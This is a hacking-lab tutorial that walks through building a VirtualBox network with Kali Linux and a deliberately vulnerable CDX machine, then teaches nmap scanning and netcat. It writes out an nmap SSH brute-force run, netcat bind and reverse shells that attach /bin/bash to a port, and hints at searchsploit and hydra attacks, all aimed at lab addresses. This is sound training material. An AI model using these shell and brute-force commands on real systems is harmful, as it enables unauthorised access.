# Read Team Dojo 1: Setting up a local hacking network

In this Dojo we are going to look at setting up a personal network for Offensive Security practice.
The Katas linked near the bottom of this document will also show you where to access pre-requisites for future Dojos.

## Prerequisites

You will need an internet connected laptop with at least 4GB of RAM, 200GB of Disk Space and that can handle virtualisation. The links provided assume that you are using the current version of VirtualBox. Please note all of the screenshots were taken using Virtual Box 5 on a Windows 10 machine.   

### Installed

Please have these installed prior to attending.

1. Virtual Box - [latest version](https://www.virtualbox.org/wiki/Downloads)
If using Windows, Install this package as administrator to ensure all the virtual drivers get installed.

2. Virtual Box Addons - [latest version](https://download.virtualbox.org/virtualbox/6.0.4/Oracle_VM_VirtualBox_Extension_Pack-6.0.4.vbox-extpack)
3. 7zip - [latest version](https://www.7-zip.org/download.html)

### Required Downloads

> Make sure that you download the __Virtual Box__ and __not__ the VMware versions of these images.

These are the resources you will need for the Lab, downloading them prior to attending will ensure you have adequete time to complete all exercises. 

1. Kali VM [OVA](https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/)
2. CDX [OVA](https://drive.google.com/file/d/1JJmYtbCp52Dni1qQhGQwMO0Gl0PUfaIR/view?fbclid=IwAR2R-CPHfS__XnnmKgOy4JvQKQeIv9ych9ljAg241y_hLoO4_4WPnRMGlSk)


### Optional Downloads

These resources are required if you want to try the Additional Katas, but will not be required for the main dojo.

1. Os-Boxes Ubuntu Server [Pre Built Image](https://www.osboxes.org/ubuntu-server/)
2. Windows XP Mode [Windows Binary](https://www.microsoft.com/en-gb/download/confirmation.aspx?id=8002) - Don't install this!
3. Development Environment [Windows VMs](https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/) 
4. Ubuntu Server [OSI](https://www.ubuntu.com/download/server) 


## Setting up a Basic Lab.

This Dojo comprises of a basic core (this document) and several optional katas at the end that you can use to expand your network. To begin with we will be setting up an incredibly basic Virtual Network using Virtual Box.
There are of course alternatives to this software, but Oracle's Virtual Box is free and convenient package that runs on Windows, Linux and Apple Macs.

## 1. Configure Host Only Adapter Network

In order to get a quick start we are going to hack together a quick host only network. This has the advantage of letting us get to the good stuff quickly but carries the disadvantage of removing their internet access. For more convient lab settings using internal networking and a NAT connection check out the stretch katas at the end of the main dojo.

By default, when installed, Virtual Box creates a Host Only Adapter which can be used to allow a Host system to connect to its guest VMs. This adapter is a virtual NIC, and as a vNIC it can also can be used to host multiple IP Addresses. We are going to use this capability to host a 2 VM network.

1. From the VirtualBox GUI, select __Host Network Adapter__ from the __File__ dropdown.

2. If you don't already have a _VirtualBox Host-Only Etherner Adapter_ select __Create__ to make one.

3. Right click on the __Name__ and select __properties__

![v-adapter.png](images/dojo1/v-adapter.png)

4. In the __Adapter__ tab, select __Configure Adapter Automatically__ and _enable the server_ in __DHCP Server__. You can configure the network as you see fit, but the defaults are suitable for our purposes.

At this satge we have completed all the Virtual Box configuration that we need to do to complete the Lab.

## 2. First VM: Import the Kali OVA

This portion of the Lab we will import and configure a Kali Linux Virtual appliance for our network. Kali is the spiritual successor to Backtrack and is a Pentesting Framework built on Debian Testing. It has been designed to provide pentesters all the tools they need while removing the hassle of system configuration. By default Kali only comes with the root user, which makes it unsafe to use as a primary OS if you do not know what you are doing. Using Kali as a VM elimiates a lot of this risk as you can still use the Host's OS for your day to day activites.  

An OVA is a is the file type which VirtualBox uses to identify virtual appliances. It is a package that contains files used to describe a virtual machine, which includes an .OVF descriptor file, optional manifest (.MF) and certificate files, and other related files. We are going to import a Kali [OVA](https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/) for use in our Lab. 

1. Via the GUI select __File > Import__ and search for your downloaded Kali OVA. Once selected the appliance's configuration will populate in the settings window. Before you click __Import__  make sure that you __Reinitialize the MAC address of all network cards__. This will prevent networking issues later on.

![ova-import.png](images/dojo1/ova-import.png)

2. After a few minutes your Appliance will be ready to power on. Before we do we want to configure a __Host only Adapter__ for some easy networking. Making sure the imported VM is selected click on __Network__ on the right hand side of the GUI. In Adapter 1 Changed the _Attached to:_ dropdown to __Host-only Adapter__ and click OK. 

![host_only.png](images/dojo1/host_only.png)

This will connect the Appliance to the default Host Only Network on your Host device.

3. Power On the VM and in the window that pops up, select the __Devices__ menu and __Insert Guest Additions CD image__. All the features will take effect on the next re-boot, but for now log in to the VM using the default credentials of:

* username: root
* password: toor

4. Check you have connection via NAT to the internet, by pinging Google and check out your network configuration with the following commands:

```
ping google.com -c 3 && ifconfig
```

![ping-google.png](images/dojo1/ping-google.png)

5. Take note of the IP address in eth0. In the image this is 10.0.2.15, yours may be different depending on your Host Adapter Settings.

Now you have a full fledged Kali Linux Appliance that you can use for internal assessments.

## 3. Second VM: Import the CDX OVA.

CDX or Cyber Defense eXercise is an annual hackathon which students from a local university patch vulnerable systems and, after a set period of time do their best to defend nasty Offense focused Red Team professionals like ourselves. In this part of the Dojo we are going to import one of the 2019 boxes to our lab for practice. The steps are nearly identical to the previous exercise, please refer back to them for reference diagrams.

> Depending on the storage mechanism we are using you may need to use an archive manager to extract the OVA file. 

1. Import the OVA, remembering to __Reinitialize the MAC address of all network cards__.

2. Go to the Network menu and configure Adapter 1 to be Host Only.

3. Next power up the machine and attach the Virtual Box Extensions via the device dropdown menu.

You may get an issue here with the networking job, if you do reboot / reset the system via the __Machine__ dropdown and select __Advanced Options__ from the boot menu. This will allow you to run recovery mode.

![recovery.png](images/dojo1/recovery.png)

Once it boots, select __Enable networking__ from the network option.

![network.png](images/dojo1/network.png)

This should pick up an IP address and then return to the menu.

4. Log into the machine with the credentials:

* username: dojo
* password: dojo

or

* username: root
* password: toor

5. Once you've logged in check your ip address with `ifconfig` and that you can ping the Kali VM.

6. From the Kali Appliance open Firefox and visit the IP address of the CDX server. You should see something similar to this:

![ready_to_attack.png](images/dojo1/ready_to_attack.png)

All going well you should have your very first network.

## 4. Attack the CDX System.

> Prior to attacking the CDX box, you may want to make a snapshot or clone of the image. Otherwise any changes we make will persist over reboots.

The purpose of a pentest is to try and see where specific flaws in an application's stack are weak enough to allow an attacker to gain un-authorised access. Typically, in software development we leverage automated process that focus on scanning, reporting and remediating vulnerabilities. Impact pentesting takes this a step further and assesses how these weaknesses can be leveraged to further gain access to a system. This part of the Dojo we will be considering the two most used tools in an Attacker's arsenal: nmap and netcat.  


### nmap scanning

What is nmap? [Nmap](https://nmap.org/) is the foundation on which most networking asessments is built. Dubbed by many as the swiss army knife of pentesting tools it has a fantastic array of features we will use. At its heart nmap is a network mapper, it can be used to identify devices and services on your network and comes with a scripting engine that can be leveraged to test vulnerabilities.

A simple direct scan against a specific ip can be run with the following syntax:
`nmap <ip> -p <port>` __NOTE__ tha IP addresses may not be the same as in the documentation.

Lets see what our Kali system is running with default ports:
```
nmap 127.0.0.1
```
With specified individual ports and port ranges:
```
nmap 127.0.0.1 -p 22,80,60-67,443
```
We aren't running any services, so all the ports are closed.

Now try starting an apache webserver and run the previous command
```
service apache2 start
nmap 127.0.0.1 -p 22,80,60-67,443
```
By default this has opened port 80 as you should see on your output.
Stop the server
```
service apache2 stop
```
A useful technique when first landing on a network is to scan your surroundings. Running a full scan is costly and generates a lot of traffic, so lets perform a ping scan to reduce the noise. We can use either CIDR notation or IP Range notation.
```
nmap -sP 192.168.56.0/24
```
or
```
nmap -sP 192.168.56.1-254
```
This reduces the scope of our attack to far less IP addresses. Ordinarily we would run scans against single machines to reduce network traffic, but to show off syntax for multiple machines:

```
nmap 192.168.56.100,101,102,103
```

Take a momnet to try and work out what the results mean. One of the IPs is likley to be your Kali, another your host, a different one will be the Host-Only Gateway and one will be the CDX box.

It is pretty hard to tell, try using the -O flag to get an estimate of the operating systems
```
nmap 192.168.56.100,101,102,103 -O
```

On my network the CDX box is 192.168.56.102, I've found a victim!

From here I can probe the system with more specific requests to see how the system reacts. the -A flag is an enables and agrressive scan which provides a lot of indepth information, but has the downside of being really noisy. Additionally for stealth there are options around timing, packet types and using UDP or TCP scans. Experiment with these and the nmap manual to find out some of its capabilities.

One last thing to show is the scripting engine. Kali comes with a pre-loaded 500+ nmap scripts stored in
`/usr/share/nmap/scripts/` these can be leveraged via the --script= argument. Be careful using these as they can mess with the service and potentially bring it down, making it unusable as an attack vector later. 

Lets run a ssh login brute force script in really verbose mode:

```
nmap 192.168.56.102 -p 22 --script ssh-brute.nse -vv
```
After a few moments the session will satrt and you will seee the various login attempts in the terminal.
Once you are satisfied with what is going on, feel free to cancel the attack with `Ctl^ C` or wait until the end.

## nc & Shells
In OffSec we ofter refer to 'popping shells' on targets, but what do we mean by this? Popping a shell on a system is when we achieve remote code execution (RCE) on a target. There are many different types of shell, but ultimately in the game that is pen testing we only count it as a popped shell shell if we get interactive command line or terminal access. 
Often RCE is achievable via an unsecured feature or a bonus function (CLIs anyone?!?) on a server. While you can do a lot of damage with RCE, nothing says pwnd like a fully interactive terminal. 
There are dozens of tools and resources available on this subject, many of which we will be diving into in later dojos but for now we are going to consider netcat (nc) to demonstrate bind and reverse shells. 
For these exercises open two terminals.

NC allows you to arbitrarily open communication channels between two machines. It uses a similar sytax to nmap: `nmap <ip> <port>` but without the -p for connecting to target ports. 

In a pinch you can use it as a port scanner with -z, -v keeps things verbose

```
nc -zv 192.168.56.102 1-65535
```

You can pipe commands down it to interact with servers, this will get you headers.

```
echo -n "GET / HTTP/1.1\r\n\r\n" | nc 192.168.56.102 80
```

Where nc really shines is in server mode. In server mode we can open a non servicename (-n) listening (-l) port (-p) in verbose (-v) mode with the following command:

_terminal 1_
```
nc -nvlp 1337
```

in a seperate terminal, we can connect to it:

_terminal 2_
```
nc -v 127.0.0.1 1337
```
You will see this connects, and you can send typed messages down either side. Give it a try.

You can also pipe commands down a nc connection, set up a listener:

_terminal 1_
```
nc -nvlp 1337
```
execute the command via the -e flag

_terminal 2_
```
nc -v 127.0.0.1 1337 -e /usr/sbin/ifconfig
```
This works both ways, why not try it by attaching a command to the listener side?

So this is pretty cool, you can also use nc and redirects to transfer files. Can you work out how?

Probrably the most abused/dangerous feature of netcat is the ability to attach a bind or a reverse shell to a port. A bind shell is possibly the easiest to understand at first, this is where we attach a shell (bash) to a port and then connect to it. Much like standing up a server and connecting a client to it.

We set up the listener with a bash shell

_terminal 1 victim_
```
nc -nvlp 1337 -e /bin/bash
```

and then connect to it via

_terminal 2 attacker_
```
nc -v 127.0.0.1 1337
```
note you can run commands from terminal 2, try some basic commands.

A bind shell is useful, but has some drawbacks as it is easy to detect and stop with ingress firewalls.
So how do we bypass this restriction? We make our connection look like egress traffic via a reverse shell.
This time we make the victim connect to a listener on the attacking machine and send its bash terminal over the pipe.  

this time we set a listener up on the attacker first

_terminal 2 attacker_
```
nc -nvlp 1337 
```

next we execute bash down our client connection to the kali machine

_terminal 1 victim_
```
nc -v 127.0.0.1 1337 -e /bin/bash
```

Because the victim initiated the connection, it looks like it is requesting access to a legitimate sevice on the attacker. when combined with encrypted tunnels this is a very powerful way to avoid network level security.

This ends the tutorial component of the Dojo, next try and use these tools to attack the CDX box below.

### The CDX machine
As the red team for hire we've been been tasked by Sequelios to determine how they've lost access to their new voting system on the eve of their election. Any attempts they make to revert are quickly undone by an unkown assailant and they have lost control of the system. The Sequelios officials suspect foul play and have hired us to assess the system for weakness and try to regain control of the system before democracy fails!

Can you use you new found skills to find the hacker's back door and make your way into the system?

### Some undocumented things to Try

* nmap doesn't scan all ports by default, see if you can workout how to find any hidden services
* you can auto pwn a sevice with a vulnerability stored on kali. Can you find it with searchsploit?
* You have access to port 22 and know login details for the system. Can you re-create an ssh login using hydra?
* Documentation is important, nmap has some flags that allow for static file outputs. See if you can find one you like that isn't an output re-direct.

## Additional Network Katas

* [Import the Kali OVA to an Internal Network](kali-ova.md)
* [Import a Virtual Disk Image (VDI)](configure-vdi.md)
* [Free(ish) Windows XP](windows-xp.md)
* [Windows 7, 8 & 10](windows-xp.md)
* [Damn Vulnerable Web App](dvwa.md)

## Recommended Resources

### Free Educational Sites

* Metasploit Unleashed – [Free Ethical Hacking Course](https://www.offensive-security.com/metasploit-unleashed/)
* Vuln Hub - [Virtual Machines](https://www.vulnhub.com/)
* HakerOne [Hacker 101](https://www.hackerone.com/hacker101)
* Hack the Box - [CTF Site](https://www.hackthebox.eu/)
* [Cybrary](https://www.cybrary.it/)

### Getting Started Books

* [Penetration Testing: A Hands-On Introduction to Hacking](https://www.amazon.co.uk/Penetration-Testing-Hands-Introduction-Hacking/dp/1593275641/ref=asc_df_1593275641/?tag=googshopuk-21&linkCode=df0&hvadid=311013355418&hvpos=1o1&hvnetw=g&hvrand=14721075246741116845&hvpone=&hvptwo=&hvqmt=&hvdev=c&hvdvcmdl=&hvlocint=&hvlocphy=1007340&hvtargid=pla-433822384008&psc=1&th=1&psc=1)
* [Kali Unleashed](https://www.kali.org/download-kali-linux-revealed-book/)
* [RTFM: Red Team Field Manual](https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504)